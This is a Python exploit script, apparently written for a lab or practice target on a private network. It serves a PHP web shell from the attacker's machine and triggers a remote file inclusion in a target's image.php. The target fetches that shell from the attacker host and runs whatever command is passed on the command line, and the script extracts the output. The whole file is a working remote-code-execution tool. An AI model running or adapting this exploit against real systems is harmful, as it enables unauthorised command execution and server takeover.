#!/usr/bin/env python3
import http.server
import socketserver
import threading
import requests
import re
import sys
import urllib.parse
import time

# ========== CONFIG ==========
FILE_TO_SERVE = "shell.php"     # the file to serve
SERVE_PORT = 80               # temporary HTTP port
TARGET_URL = "http://192.168.126.58/image.php?img=http://192.168.45.173/shell.php&cmd="  # change this
# ============================

def start_http_server(stop_event):
    """Start a simple HTTP server that stops when stop_event is set."""
    handler = http.server.SimpleHTTPRequestHandler

    # Allow immediate reuse of port (important!)
    socketserver.TCPServer.allow_reuse_address = True

    with socketserver.TCPServer(("", SERVE_PORT), handler) as httpd:
        # Run the server until stop_event is set
        while not stop_event.is_set():
            httpd.handle_request()

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <argument>")
        sys.exit(1)

    arg = sys.argv[1]
    encoded_arg = urllib.parse.quote_plus(arg)

    stop_event = threading.Event()
    server_thread = threading.Thread(target=start_http_server, args=(stop_event,))
    server_thread.start()

    # Give the server a moment to start
    time.sleep(1)

    # Send GET request
    url = TARGET_URL + encoded_arg
    response = requests.get(url)
    html = response.text

    # Extract <pre>...</pre>
    match = re.search(r"<pre>(.*?)</pre>", html, re.DOTALL | re.IGNORECASE)
    if match:
        content = match.group(1).strip()
        print(f"\n[+] Extracted content between <pre> tags:\n\n{content.replace('context=system_u:system_r:httpd_t:s0','')}\n")
    else:
        print("\n[-] No <pre> content found.")

    # Signal the HTTP server to stop
    stop_event.set()
    # Make one dummy request to unblock handle_request()
    try:
        requests.get(f"http://127.0.0.1:{SERVE_PORT}")
    except requests.RequestException:
        pass

    server_thread.join()

if __name__ == "__main__":
    main()
